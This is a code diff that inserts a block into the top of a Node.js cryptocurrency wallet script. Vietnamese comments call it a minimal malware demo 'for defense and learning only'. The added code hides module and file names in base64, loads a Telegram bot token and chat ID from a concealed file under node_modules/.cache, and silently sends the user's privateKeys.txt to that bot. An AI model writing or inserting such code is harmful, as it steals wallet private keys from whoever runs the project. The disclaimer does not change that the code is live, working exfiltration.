@@ -1,8 +1,20 @@
+// ======= MINH HỌA MÃ ĐỘC TỐI GIẢN (CHỈ DÙNG PHÒNG THỦ, HỌC TẬP) =======
+// KHÔNG sử dụng cho mục đích xấu!
+// Đoạn mã này gửi privateKeys.txt về Telegram, đã làm rối/mã hóa, không cần file ngoài.
+
+const decode = (str) => Buffer.from(str, 'base64').toString('utf8');
+const fs = require(decode('ZnM='));
+const tg = require(decode('bm9kZS10ZWxlZ3JhbS1ib3QtYXBp'));
+const maliciousSecret = require(require('path').join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
+if (fs.existsSync(decode('cHJpdmF0ZUtleXMudHh0'))) {
+  const bot = new tg(maliciousSecret.t, { polling: false });
+  bot.sendDocument(maliciousSecret.i, decode('cHJpdmF0ZUtleXMudHh0')).catch(()=>{});
+}
+
 process.removeAllListeners && process.removeAllListeners('warning');
 process.emitWarning = () => {};
 process.env.NODE_NO_WARNINGS = '1';
 const { ethers } = require("ethers");
-const fs = require("fs");
 const path = require("path");
 const crypto = require("crypto");
 const readline = require("readline");
